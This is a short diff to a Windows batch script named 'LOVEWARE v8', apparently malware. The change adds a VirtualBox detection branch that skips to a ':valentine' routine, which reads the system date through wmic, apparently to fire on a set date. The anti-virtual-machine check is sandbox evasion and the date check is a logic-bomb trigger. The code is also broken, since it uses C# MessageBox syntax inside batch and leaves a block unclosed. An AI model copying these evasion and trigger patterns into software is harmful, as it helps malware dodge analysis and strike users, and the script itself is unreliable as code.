@@ -1,6 +1,6 @@
 @echo off
 
-:: LOVEWARE v7.8
+:: LOVEWARE v8
 ::
 :: YOU CAN DELETE THIS 
 :: |  |  |  |  |  |  |
@@ -81,9 +81,12 @@ echo %var%
 
 if %var% == VirtualBox (
     MessageBox.Show("ERROR could not run application", Valentine);
-
+) else (
+    goto valentine
 
 :: Do not run on valentine function
+
+:valentine
 
 for /f "skip=1" %%x in ('wmic os get localdatetime') do if not defined MyDate set MyDate=%%x
 for /f %%x in ('wmic path win32_localtime get /format:list ^| findstr "="') do set %%x
